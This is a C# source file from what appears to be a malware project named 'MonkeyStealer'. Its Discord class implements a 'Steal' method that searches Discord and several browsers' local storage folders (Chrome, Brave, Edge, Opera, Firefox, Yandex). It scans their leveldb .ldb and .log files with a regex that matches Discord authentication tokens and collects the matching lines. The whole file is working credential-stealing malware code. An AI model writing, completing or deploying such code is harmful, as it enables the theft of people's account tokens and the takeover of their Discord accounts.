using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.JavaScript;
using System.Text.RegularExpressions;

namespace MonkeyStealer.scripts
{
    public class Discord : IStealer
    {
        public List<string> Steal()
        {
            string appData = Environment.ExpandEnvironmentVariables("%AppData%");
            string localData = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%");
            List<string> locations = new List<string>()
            {
                appData + "\\Discord",
                appData + "\\discordcanary",
                appData + "\\discordptb",
                appData + "\\Opera Software\\Opera Stable",
                appData + "\\Mozilla\\Firefox\\Profiles",
                localData + "\\Google\\Chrome\\User Data\\Default",
                localData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
                localData + "\\Yandex\\YandexBrowser\\User Data\\Default\"",
                localData + "\\Microsoft\\Edge\\User Data\\Default"
            };
            List<string> tokens = new List<string>();
            foreach (string location in locations)
            {
                if (Directory.Exists(location))
                {

                    foreach (string token in getToken(location))
                    {
                        tokens.Add(token);
                    }
                }
            }
            return tokens;
        }
        private List<string> getToken(string path)
        {
            string target = path + "\\Local Storage\\leveldb";
            string[] filesPath = Directory.GetFiles(target);
            Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
            List<string> tokens = new List<string>();

            foreach (string file in filesPath)
            {
                if (file.Contains(".ldb") || file.Contains(".log"))
                {
                    try
                    {
                        string[] lines = File.ReadAllLines(file);
                        foreach (string line in lines)
                        {
                            Match lope = regex.Match(line);
                            if (lope.Success)
                            {
                                tokens.Add(line + "\n\n\n");
                            }
                        }
                    }
                    catch (Exception ex)
                    {

                    }
                }
            }
            return tokens;
        }
    }
}

